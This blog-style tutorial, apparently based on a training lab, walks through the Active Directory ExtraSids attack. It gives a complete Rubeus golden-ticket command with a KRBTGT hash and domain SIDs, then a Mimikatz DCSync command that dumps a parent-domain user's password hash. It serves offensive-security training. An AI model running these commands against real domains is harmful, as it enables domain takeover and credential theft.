---
title: "Active Directory Series - ExtraSids Attack with Rubeus - Episode 4"
datePublished: Wed Mar 27 2024 20:38:48 GMT+0000 (Coordinated Universal Time)
cuid: clua9qgaq000908k1gxxfbgk3
slug: active-directory-series-extrasids-attack-with-rubeus-episode-4

---

The ExtraSids Attack is a technique used to gain unauthorized access to a parent domain from a compromised child domain in an Active Directory environment. This attack leverages the trust relationship between the child and parent domains, allowing an attacker to create a forged Golden Ticket with elevated privileges in the parent domain.

## **Prerequisites and Setup**

Before attempting the ExtraSids Attack, ensure that you have the following:

* Access to a compromised machine in the child domain
    
* Rubeus, a tool for manipulating Kerberos tickets
    
* Knowledge of the child domain's KRBTGT account NT hash
    
* SID of the child domain and the target user or group in the parent domain
    

## **Confirming No Access to the Parent Domain Controller**

Before proceeding with the attack, confirm that you do not have access to the parent domain controller's file system.

### **Using PowerShell, attempt to access the C$ share of the parent domain controller:**

```powershell

PS C:\\htb> ls \\\\academy-ea-dc01.inlanefreight.local\\c$
```

### **If access is denied, you will see an error message similar to:**

```powershell

ls : Access is denied
    At line:1 char:1
    + ls \\\\academy-ea-dc01.inlanefreight.local\\c$
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : PermissionDenied: (\\\\academy-ea-dc01.inlanefreight.local\\c$:String) [Get-ChildItem], UnauthorizedAccessException
        + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

This confirms that you do not have direct access to the parent domain controller.

## **Formulating the Rubeus Command**

To create a Golden Ticket using Rubeus, you will need to provide the following information:

* `/rc4`: The NT hash of the child domain's KRBTGT account
    
* `/domain`: The FQDN of the child domain
    
* `/sid`: The SID of the child domain
    
* `/sids`: The SID of the target user or group in the parent domain (e.g., Enterprise Admins)
    
* `/user`: The username to use for the forged ticket
    

### **Example Rubeus command:**

```powershell

.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## **Creating a Golden Ticket using Rubeus**

1. Run the Rubeus command formulated in step 4. Rubeus will generate a forged Golden Ticket with the specified parameters.
    
2. The output will include information about the generated ticket, such as:
    
    * Ticket Encryption Type
        
    * Ticket Flags
        
    * Start Time, End Time, and Renew Time
        
    * Session Key Type
        
    * Cache Flags
        
    * Base64-encoded ticket (KERB-CRED)
        
3. If the ticket is successfully imported, Rubeus will display the message `[+] Ticket successfully imported!`
    

## **Verifying the Golden Ticket**

1. Use the `klist` command to check if the forged Golden Ticket is present in the Kerberos ticket cache:
    

```powershell

PS C:\\htb> klist
```

1. The output should show the forged ticket with the specified username (e.g., hacker) and the target domain (e.g., LOGISTICS.INLANEFREIGHT.LOCAL).
    
2. Verify that the ticket flags include forwardable, renewable, initial, and pre\_authent.
    

## **Performing a DCSync Attack**

1. With the forged Golden Ticket, you can now perform a DCSync attack against the parent domain to retrieve sensitive information, such as user hashes.
    
2. Use Mimikatz to execute the DCSync attack, targeting a specific user account in the parent domain (e.g., INLANEFREIGHT\\lab\_adm):
    

```powershell

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL
```

1. Mimikatz will connect to the parent domain controller and retrieve the specified user's account information, including:
    
    * SAM Username
        
    * Account Type
        
    * User Account Control flags
        
    * Password last change timestamp
        
    * Object Security ID (SID)
        
    * NTLM hash of the user's password
        

## **Troubleshooting and Best Practices**

* Ensure that you have the correct NT hash for the child domain's KRBTGT account.
    
* Double-check the SIDs for the child domain and the target user or group in the parent domain.
    
* If the Golden Ticket is not working as expected, verify that the ticket flags include forwardable, renewable, initial, and pre\_authent.
    
* When performing a DCSync attack against a specific user in the parent domain, make sure to specify the target domain using the `/domain` parameter followed by the FQDN of the parent domain.
    
* Always use caution when executing attacks and ensure that you have proper authorization and legal permission to perform these actions.
    

## **Conclusion and Further Reading**

In this guide, you learned how to perform an ExtraSids Attack using Rubeus to gain unauthorized access to a parent domain from a compromised child domain. By creating a forged Golden Ticket with elevated privileges, you can execute a DCSync attack and retrieve sensitive information from the parent domain.